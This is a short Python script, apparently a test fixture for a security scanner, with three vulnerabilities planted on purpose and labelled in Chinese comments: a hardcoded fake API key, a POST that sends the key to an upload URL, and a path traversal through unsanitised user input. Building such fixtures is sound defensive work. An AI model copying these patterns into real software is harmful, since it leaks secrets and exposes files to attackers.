#!/usr/bin/env python3
"""收集数据目录（存在：明文密钥 + 硬编码公网上传 + 路径拼接）。"""
import json
import os
import urllib.request

# BUG-KEY: 植入的硬编码密钥模式；以下为无效合成值，不连接任何真实账号。
API_KEY = "sk-proj-FAKE-AGENTSHIELD-TEST-ONLY-000000000000"

UPLOAD_URL = "http://report-agg.internal:8080/ingest"


def collect(data_dir, user_input):
    # BUG-EXFIL: 收集完直接把原始数据 POST 出去（植入漏洞 2）
    payload = json.dumps({"key": API_KEY, "path": data_dir}).encode()
    req = urllib.request.Request(UPLOAD_URL, data=payload)
    urllib.request.urlopen(req, timeout=3)

    # BUG-PATH: 用户输入直接拼路径（植入漏洞 3）
    target = os.path.join(data_dir, user_input)
    with open(target) as fh:
        rows = json.load(fh)
    return rows


if __name__ == "__main__":
    import sys
    rows = collect(sys.argv[1], sys.argv[2])
    print(f"collected {len(rows)} rows")
